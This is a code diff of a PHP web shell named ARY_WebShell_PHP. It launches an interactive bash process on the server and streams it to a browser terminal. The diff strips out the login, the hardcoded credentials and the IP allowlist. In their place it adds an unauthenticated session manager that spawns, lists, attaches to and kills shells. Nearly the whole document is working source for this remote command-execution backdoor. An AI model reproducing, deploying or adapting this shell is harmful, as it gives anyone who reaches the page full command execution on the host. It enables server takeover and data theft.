@@ -22,126 +22,111 @@
  * limitations under the License.
  */
 
-session_start();
-
 /* ========================================== */
-/* --- USER SECURITY & CONFIGURATION -------- */
-/* ========================================== */
-define('CONFIG_USERNAME', 'admin');
-define('CONFIG_PASSWORD', 'password123');
-define('STATIC_TOKEN', 'securetoken123');
-
-// Set to "*" to allow anyone, or specify IPs like: ["127.0.0.1", "192.168.1.15"]
-$ALLOWED_IPS = ["*"];
+/* --- SESSION MANAGEMENT UTILITIES --------- */
 /* ========================================== */
 
-/* --- IP Allowlist --- */
-function is_ip_allowed(): bool {
-    global $ALLOWED_IPS;
-    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-    foreach ($ALLOWED_IPS as $allowed) {
-        if ($allowed === '*' || $allowed === $ip) {
-            return true;
-        }
-    }
-    return false;
-}
-
-if (!is_ip_allowed()) {
-    http_response_code(403);
-    die('<h1>403 Forbidden</h1><p>Unauthorized IP address.</p>');
-}
-
-/* --- Auth --- */
-function require_auth(): void {
-    if (empty($_SESSION['ary_auth']) || $_SESSION['ary_auth'] !== true) {
-        http_response_code(401);
-        header('Content-Type: application/json');
-        echo json_encode(['status' => 'error', 'message' => 'Unauthorized']);
-        exit;
-    }
-}
-
-/* --- Cleanup old shell --- */
-function kill_old_shell(): void {
-    $sid = session_id();
-    $pidFile = sys_get_temp_dir() . '/ary_pid_' . $sid;
+function kill_session(string $id): void {
+    $temp = sys_get_temp_dir();
+    $pidFile = $temp . '/ary_' . $id . '_pid';
     if (file_exists($pidFile)) {
-        $oldPid = (int) file_get_contents($pidFile);
-        if ($oldPid > 0 && function_exists('posix_kill')) {
+        $pid = (int) file_get_contents($pidFile);
+        if ($pid > 0 && function_exists('posix_kill')) {
             $sigkill = defined('SIGKILL') ? SIGKILL : 9;
-            @posix_kill($oldPid, $sigkill);
-            @posix_kill(-$oldPid, $sigkill); // process group
+            @posix_kill($pid, $sigkill);
+            @posix_kill(-$pid, $sigkill); // process group
         }
         @unlink($pidFile);
     }
-    $inputFile = sys_get_temp_dir() . '/ary_input_' . $sid;
-    @unlink($inputFile);
+    @unlink($temp . '/ary_' . $id . '_input');
 }
 
-/* --- Routing --- */
-$action = $_GET['action'] ?? 'login';
+function list_sessions(): array {
+    $temp = sys_get_temp_dir();
+    $sessions = [];
+    foreach (glob($temp . '/ary_*_pid') as $pidfile) {
+        if (!preg_match('/ary_([a-f0-9]+)_pid$/', basename($pidfile), $m)) continue;
+        $id = $m[1];
+        $pid = file_exists($pidfile) ? (int) file_get_contents($pidfile) : 0;
+        $alive = ($pid > 0 && function_exists('posix_kill') && @posix_kill($pid, 0));
+        if (!$alive) {
+            @unlink($pidfile);
+            @unlink($temp . '/ary_' . $id . '_input');
+            continue;
+        }
+        $sessions[] = [
+            'id' => $id,
+            'pid' => $pid,
+            'created' => date('Y-m-d H:i:s', filemtime($pidfile))
+        ];
+    }
+    usort($sessions, fn($a, $b) => strcmp($b['created'], $a['created']));
+    return $sessions;
+}
+
+/* ========================================== */
+/* --- ROUTING ------------------------------ */
+/* ========================================== */
+
+$action = $_GET['action'] ?? 'list';
 
 switch ($action) {
-    case 'api_login':
-        header('Content-Type: application/json');
-        $data = json_decode(file_get_contents('php://input'), true);
-        $user = $data['username'] ?? '';
-        $pass = $data['password'] ?? '';
-        
-        if ($user === CONFIG_USERNAME && $pass === CONFIG_PASSWORD) {
-            $_SESSION['ary_auth'] = true;
-            $_SESSION['ary_token'] = STATIC_TOKEN;
-            echo json_encode(['status' => 'ok', 'token' => STATIC_TOKEN]);
+    case 'create':
+        if (function_exists('random_bytes')) {
+            $id = bin2hex(random_bytes(4));
         } else {
-            http_response_code(401);
-            echo json_encode(['status' => 'error', 'message' => 'Invalid credentials']);
+            $id = uniqid();
         }
+        file_put_contents(sys_get_temp_dir() . '/ary_' . $id . '_input', '');
+        header('Location: ?action=terminal&id=' . $id);
+        exit;
+
+    case 'kill':
+        $id = $_GET['id'] ?? '';
+        if (preg_match('/^[a-f0-9]+$/', $id)) {
+            kill_session($id);
+        }
+        header('Location: ?action=list');
         exit;
 
     case 'stream':
-        require_auth();
-        session_write_close(); // Release session lock so /input requests don't block
+        $id = $_GET['id'] ?? '';
+        if (!preg_match('/^[a-f0-9]+$/', $id)) {
+            http_response_code(400);
+            exit;
+        }
         
         header('Content-Type: text/event-stream');
         header('Cache-Control: no-cache');
         header('Connection: keep-alive');
-        header('X-Accel-Buffering: no'); // Prevent nginx buffering
+        header('X-Accel-Buffering: no');
         
         ignore_user_abort(true);
         set_time_limit(0);
         if (ob_get_level() > 0) ob_end_flush();
         ob_implicit_flush(true);
         
-        $sid = session_id();
-        $inputFile = sys_get_temp_dir() . '/ary_input_' . $sid;
-        $pidFile = sys_get_temp_dir() . '/ary_pid_' . $sid;
+        $temp = sys_get_temp_dir();
+        $pidFile = $temp . '/ary_' . $id . '_pid';
+        $inputFile = $temp . '/ary_' . $id . '_input';
         
-        kill_old_shell();
+        // Kill any stale shell for this session ID before spawning fresh
+        kill_session($id);
         file_put_contents($inputFile, '');
         
-        // Try PTY first (PHP 8.1+) so signals like Ctrl+C work natively
+        // Try PTY first (PHP 8.1+)
         $descriptorspec = [];
         if (PHP_VERSION_ID >= 80100) {
-            $descriptorspec = [
-                0 => ['pty'],
-                1 => ['pty'],
-                2 => ['pty']
-            ];
+            $descriptorspec = [0 => ['pty'], 1 => ['pty'], 2 => ['pty']];
         }
         
         $env = ['TERM' => 'xterm-256color', 'HOME' => sys_get_temp_dir()];
-        $cwd = sys_get_temp_dir();
-        $process = @proc_open('/bin/bash -i', $descriptorspec, $pipes, $cwd, $env);
+        $process = @proc_open('/bin/bash -i', $descriptorspec, $pipes, sys_get_temp_dir(), $env);
         
-        // Fallback to pipes if PTY is unavailable
+        // Fallback to pipes
         if (!is_resource($process)) {
-            $descriptorspec = [
-                0 => ['pipe', 'r'],
-                1 => ['pipe', 'w'],
-                2 => ['pipe', 'w']
-            ];
-            $process = proc_open('/bin/bash -i', $descriptorspec, $pipes, $cwd, $env);
+            $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
+            $process = proc_open('/bin/bash -i', $descriptorspec, $pipes, sys_get_temp_dir(), $env);
         }
         
         if (!is_resource($process)) {
@@ -152,20 +137,15 @@ switch ($action) {
         $status = proc_get_status($process);
         file_put_contents($pidFile, $status['pid']);
         
-        if (isset($pipes[1]) && is_resource($pipes[1])) stream_set_blocking($pipes[1], false);
-        if (isset($pipes[2]) && is_resource($pipes[2])) stream_set_blocking($pipes[2], false);
-        if (isset($pipes[0]) && is_resource($pipes[0])) stream_set_blocking($pipes[0], false);
+        foreach ($pipes as $p) if (is_resource($p)) stream_set_blocking($p, false);
         
-        // Welcome message
-        echo "data: " . json_encode(['out' => "\r\n\x1b[32m[*] ARY_WebShell_PHP connected — type your commands below\x1b[0m\r\n"]) . "\n\n";
+        echo "data: " . json_encode(['out' => "\r\n\x1b[32m[*] Session {$id} connected — type your commands below\x1b[0m\r\n"]) . "\n\n";
         flush();
         
         while (true) {
-            if (connection_aborted()) {
-                break;
-            }
+            if (connection_aborted()) break;
             
-            // Atomic read + clear of input buffer so rapid keys don't race
+            // Atomic read + clear input buffer
             if (file_exists($inputFile)) {
                 $fp = fopen($inputFile, 'c+');
                 $input = '';
@@ -177,7 +157,6 @@ switch ($action) {
                         flock($fp, LOCK_UN);
                     }
                     fclose($fp);
-                    
                     if ($input !== '' && isset($pipes[0]) && is_resource($pipes[0])) {
                         fwrite($pipes[0], $input);
                         fflush($pipes[0]);
@@ -186,18 +165,13 @@ switch ($action) {
             }
             
             $out = '';
-            
             if (isset($pipes[1]) && is_resource($pipes[1])) {
                 $buf = fread($pipes[1], 4096);
-                if ($buf !== false && $buf !== '') {
-                    $out .= $buf;
-                }
+                if ($buf !== false && $buf !== '') $out .= $buf;
             }
             if (isset($pipes[2]) && is_resource($pipes[2])) {
                 $buf = fread($pipes[2], 4096);
-                if ($buf !== false && $buf !== '') {
-                    $out .= $buf;
-                }
+                if ($buf !== false && $buf !== '') $out .= $buf;
             }
             
             if ($out !== '') {
@@ -205,49 +179,49 @@ switch ($action) {
                 flush();
             }
             
-            // SSE comment heartbeat to keep connection alive
             echo ":hb\n\n";
             flush();
             
             $status = proc_get_status($process);
             if (!$status['running']) {
-                echo "data: " . json_encode(['out' => "\r\n\x1b[31m[!] Shell process terminated\x1b[0m\r\n"]) . "\n\n";
+                echo "data: " . json_encode(['out' => "\r\n\x1b[31m[!] Shell terminated\x1b[0m\r\n"]) . "\n\n";
                 flush();
                 break;
             }
-            
-            usleep(50000); // 50ms poll
+            usleep(50000);
         }
         
         @proc_terminate($process);
         @proc_close($process);
-        @unlink($inputFile);
         @unlink($pidFile);
+        @unlink($inputFile);
         exit;
 
     case 'input':
-        require_auth();
-        session_write_close();
+        $id = $_GET['id'] ?? '';
+        if (!preg_match('/^[a-f0-9]+$/', $id)) {
+            http_response_code(400);
+            echo json_encode(['status' => 'error']);
+            exit;
+        }
         
         header('Content-Type: application/json');
         $data = json_decode(file_get_contents('php://input'), true);
         $key = $data['key'] ?? '';
         
-        $sid = session_id();
-        $inputFile = sys_get_temp_dir() . '/ary_input_' . $sid;
-        $pidFile = sys_get_temp_dir() . '/ary_pid_' . $sid;
+        $temp = sys_get_temp_dir();
+        $inputFile = $temp . '/ary_' . $id . '_input';
+        $pidFile = $temp . '/ary_' . $id . '_pid';
         
         file_put_contents($inputFile, $key, FILE_APPEND | LOCK_EX);
         
-        // Ctrl+C (ETX, \x03) needs an explicit SIGINT when running in pipe
-        // fallback mode. In PTY mode the kernel handles it, but sending an
-        // extra signal is harmless and guarantees it works everywhere.
+        // Explicit SIGINT fallback for non-PTY hosts
         if (strpos($key, "\x03") !== false && file_exists($pidFile)) {
             $pid = (int) file_get_contents($pidFile);
             if ($pid > 0 && function_exists('posix_kill')) {
                 $sigint = defined('SIGINT') ? SIGINT : 2;
-                @posix_kill($pid, $sigint);      // direct signal
-                @posix_kill(-$pid, $sigint);     // process group (best-effort)
+                @posix_kill($pid, $sigint);
+                @posix_kill(-$pid, $sigint);
             }
         }
         
@@ -255,28 +229,20 @@ switch ($action) {
         exit;
 
     case 'resize':
-        require_auth();
-        session_write_close();
         header('Content-Type: application/json');
-        // Resize via stty requires PTY ioctl; not easily available in pure PHP.
-        // If running under a real PTY, the kernel usually handles basic resize automatically.
         echo json_encode(['status' => 'ok']);
         exit;
 
-    case 'logout':
-        kill_old_shell();
-        session_destroy();
-        header('Location: ?action=login');
-        exit;
-
     case 'terminal':
-        require_auth();
-        // Fall through to HTML output
+        $id = $_GET['id'] ?? '';
+        if (!preg_match('/^[a-f0-9]+$/', $id)) {
+            header('Location: ?action=list');
+            exit;
+        }
         break;
 
-    case 'login':
+    case 'list':
     default:
-        // Fall through to HTML output
         break;
 }
 ?>
@@ -285,75 +251,109 @@ switch ($action) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <?php if ($action === 'login'): ?>
-    <title>ARY_Webshell Login</title>
+    <?php if ($action === 'list'): ?>
+    <title>ARY_Webshell - Sessions</title>
     <style>
         * { box-sizing: border-box; }
         body {
             font-family: system-ui, -apple-system, sans-serif;
             background: #1a1b26;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+            color: #a9b1d6;
             margin: 0;
+            padding: 40px 20px;
         }
-        .card {
-            background: #24283b;
-            padding: 2.5rem;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
-            width: 100%;
-            max-width: 320px;
-            text-align: center;
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
         }
-        h2 { color: #a9b1d6; margin-top: 0; margin-bottom: 5px; }
-        .subtitle { color: #565f89; font-size: 12px; margin-bottom: 20px; font-weight: bold; }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #414868;
-            border-radius: 6px;
-            background: #16161e;
-            color: #c0caf5;
-            outline: none;
-            transition: border 0.3s;
-        }
-        input:focus { border-color: #7aa2f7; }
-        button {
-            width: 100%;
-            padding: 12px;
-            margin-top: 15px;
+        h2 { color: #c0caf5; margin-top: 0; }
+        .subtitle { color: #565f89; font-size: 14px; font-weight: bold; margin-left: 10px; }
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
             background: #7aa2f7;
             color: #1a1b26;
-            border: none;
+            text-decoration: none;
             border-radius: 6px;
             font-weight: bold;
-            font-size: 16px;
+            font-size: 14px;
+            border: none;
             cursor: pointer;
-            transition: opacity 0.2s;
         }
-        button:hover { opacity: 0.8; }
-        .credit {
+        .btn:hover { opacity: 0.8; }
+        table {
+            width: 100%;
+            border-collapse: collapse;
             margin-top: 25px;
+            background: #24283b;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        }
+        th, td {
+            padding: 14px;
+            text-align: left;
+            border-bottom: 1px solid #414868;
+        }
+        th {
+            background: #16161e;
+            color: #7aa2f7;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        td { font-size: 14px; font-family: monospace; }
+        tr:hover { background: #1a1b26; }
+        .actions a {
+            color: #7aa2f7;
+            text-decoration: none;
+            margin-right: 18px;
+            font-weight: bold;
+            font-family: system-ui, sans-serif;
+        }
+        .actions a:hover { color: #c0caf5; }
+        .kill { color: #f7768e !important; }
+        .empty {
+            text-align: center;
+            padding: 50px;
+            color: #565f89;
+            background: #24283b;
+            border-radius: 8px;
+            margin-top: 25px;
+        }
+        .credit {
+            margin-top: 50px;
+            text-align: center;
             color: #414868;
             font-size: 11px;
             letter-spacing: 1px;
-            /* REMOVED: text-transform: uppercase; */
         }
         .license {
-            margin-top: 10px;
+            text-align: center;
             color: #414868;
             font-size: 10px;
+            margin-top: 5px;
         }
     </style>
     <?php elseif ($action === 'terminal'): ?>
-    <title>ARY_Webshell Terminal</title>
+    <title>ARY_Webshell - Terminal</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@latest/css/xterm.css" />
     <style>
         html, body { height: 100%; width: 100%; margin: 0; padding: 0; background: #000; overflow: hidden; }
         body { display: flex; flex-direction: column; }
+        #topbar {
+            flex: 0 0 42px;
+            background: #16161e;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+            justify-content: space-between;
+            border-bottom: 1px solid #414868;
+            z-index: 100;
+        }
+        #topbar .sess-info { color: #7aa2f7; font-size: 13px; font-weight: bold; font-family: monospace; }
+        #topbar a { color: #a9b1d6; text-decoration: none; font-size: 13px; font-weight: bold; }
+        #topbar a:hover { color: #c0caf5; }
         #toolbar {
             flex: 0 0 50px;
             display: flex;
@@ -384,39 +384,47 @@ switch ($action) {
     <?php endif; ?>
 </head>
 <body>
-<?php if ($action === 'login'): ?>
-    <div class="card">
-        <h2>ARY_WebShell_PHP</h2>
-        <div class="subtitle">Secure Remote Terminal</div>
-        <input id="u" placeholder="Username" autocomplete="off">
-        <input id="p" type="password" placeholder="Password" onkeydown="if(event.key==='Enter') login()">
-        <button onclick="login()">Connect</button>
+<?php if ($action === 'list'): ?>
+    <div class="container">
+        <h2>ARY_WebShell_PHP <span class="subtitle">Session Manager</span></h2>
+        <a href="?action=create" class="btn">+ New Session</a>
+        
+        <?php
+        $sessions = list_sessions();
+        if (empty($sessions)):
+        ?>
+            <div class="empty">No active sessions. Click <strong>"New Session"</strong> to spawn a shell.</div>
+        <?php else: ?>
+            <table>
+                <tr>
+                    <th>Session ID</th>
+                    <th>PID</th>
+                    <th>Created</th>
+                    <th>Actions</th>
+                </tr>
+                <?php foreach ($sessions as $s): ?>
+                <tr>
+                    <td><?php echo htmlspecialchars($s['id']); ?></td>
+                    <td><?php echo $s['pid']; ?></td>
+                    <td><?php echo $s['created']; ?></td>
+                    <td class="actions">
+                        <a href="?action=terminal&id=<?php echo $s['id']; ?>">Interact</a>
+                        <a href="?action=kill&id=<?php echo $s['id']; ?>" class="kill" onclick="return confirm('Kill session <?php echo $s['id']; ?>?')">Kill</a>
+                    </td>
+                </tr>
+                <?php endforeach; ?>
+            </table>
+        <?php endif; ?>
+        
         <div class="credit">made by aryan giri | giriaryan694-a11y</div>
         <div class="license">Licensed under Apache-2.0</div>
     </div>
-    <script>
-        function login() {
-            const uv = document.getElementById('u').value;
-            const pv = document.getElementById('p').value;
-            fetch('?action=api_login', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({username: uv, password: pv})
-            }).then(r => {
-                if (!r.ok) throw new Error('Invalid Credentials');
-                return r.json();
-            }).then(d => {
-                if(d.status === 'ok') {
-                    document.cookie = 'auth=' + d.token + '; path=/; SameSite=Strict;';
-                    sessionStorage.setItem('token', d.token);
-                    window.location.href = '?action=terminal';
-                }
-            }).catch(e => alert(e.message));
-        }
-    </script>
 
 <?php elseif ($action === 'terminal'): ?>
-    <script>sessionStorage.setItem('token', '<?php echo STATIC_TOKEN; ?>');</script>
+    <div id="topbar">
+        <div class="sess-info">Session: <?php echo htmlspecialchars($id); ?></div>
+        <a href="?action=list">&larr; Back to Sessions</a>
+    </div>
     <div id="toolbar">
         <button id="btn-ctrl" class="t-btn" onclick="toggleCtrl()">CTRL</button>
         <button class="t-btn" onclick="sKey('\x1b')">ESC</button>
@@ -429,6 +437,8 @@ switch ($action) {
     </div>
     <div id="terminal"></div>
     <script>
+        const sessionId = <?php echo json_encode($id); ?>;
+        
         const term = new Terminal({ cursorBlink: true, theme: { background: '#000000' } });
         const fitAddon = new FitAddon.FitAddon();
         term.loadAddon(fitAddon);
@@ -445,14 +455,11 @@ switch ($action) {
         function toggleCtrl() {
             isCtrl = !isCtrl;
             document.getElementById('btn-ctrl').style.color = isCtrl ? '#7aa2f7' : '#a9b1d6';
-            term.focus(); // CRITICAL: refocus terminal so keyboard goes to xterm, not the button
+            term.focus();
         }
 
-        const token = sessionStorage.getItem('token');
-        if (!token) window.location.href = '?action=login';
-
-        // SSE connection for shell output (PHP session cookie handles auth automatically)
-        const evtSource = new EventSource('?action=stream');
+        // SSE connection for shell output
+        const evtSource = new EventSource('?action=stream&id=' + encodeURIComponent(sessionId));
         evtSource.onmessage = e => {
             const d = JSON.parse(e.data);
             if(d.out) term.write(d.out);
@@ -464,14 +471,12 @@ switch ($action) {
         };
 
         evtSource.onerror = () => {
-            term.write('\r\n\x1b[31m[!] Connection Lost. Wiping session and redirecting...\x1b[0m\r\n');
-            document.cookie = 'auth=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
-            sessionStorage.removeItem('token');
-            setTimeout(() => window.location.href = '?action=login', 1500);
+            term.write('\r\n\x1b[31m[!] Connection Lost. Redirecting to sessions...\x1b[0m\r\n');
+            setTimeout(() => window.location.href = '?action=list', 1500);
         };
 
         function sendKey(k) {
-            fetch('?action=input', {
+            fetch('?action=input&id=' + encodeURIComponent(sessionId), {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({key: k})
@@ -479,35 +484,32 @@ switch ($action) {
         }
 
         function sKey(k) {
-            // If user had on-screen Ctrl pending, cancel it when using explicit buttons
             if (isCtrl) toggleCtrl();
             sendKey(k);
             term.focus();
         }
 
-        // Smart copy: Ctrl+C copies when text is selected, otherwise sends ^C to shell.
-        // All other physical Ctrl combos (Ctrl+D, Ctrl+Z, etc.) pass through xterm.js naturally.
+        // Smart copy: Ctrl+C copies when text selected, otherwise sends ^C to shell
         term.attachCustomKeyEventHandler((ev) => {
             if (ev.type === 'keydown' && ev.ctrlKey && (ev.key === 'c' || ev.code === 'KeyC')) {
                 if (term.hasSelection()) {
-                    return true; // Let browser/xterm handle copy
+                    return true;
                 }
                 ev.preventDefault();
                 sendKey('\x03');
-                return false; // Stop xterm.js from processing this key
+                return false;
             }
-            return true; // Let every other key process normally
+            return true;
         });
 
         term.onData(d => {
-            // On-screen Ctrl mode: convert next typed letter to control character
             if (isCtrl) {
                 if (d.length === 1) {
                     let c = d.charCodeAt(0);
-                    if (c >= 97 && c <= 122) d = String.fromCharCode(c - 96);      // a-z -> ^A-^Z
-                    else if (c >= 65 && c <= 90) d = String.fromCharCode(c - 64);   // A-Z -> ^A-^Z
+                    if (c >= 97 && c <= 122) d = String.fromCharCode(c - 96);
+                    else if (c >= 65 && c <= 90) d = String.fromCharCode(c - 64);
                 }
-                toggleCtrl(); // Consume Ctrl mode after one keystroke
+                toggleCtrl();
             }
             sendKey(d);
         });
@@ -517,11 +519,10 @@ switch ($action) {
         window.addEventListener('resize', () => {
             clearTimeout(resizeTimer);
             resizeTimer = setTimeout(() => {
-                const dims = {cols: term.cols, rows: term.rows};
-                fetch('?action=resize', {
+                fetch('?action=resize&id=' + encodeURIComponent(sessionId), {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(dims)
+                    body: JSON.stringify({cols: term.cols, rows: term.rows})
                 });
             }, 300);
         });
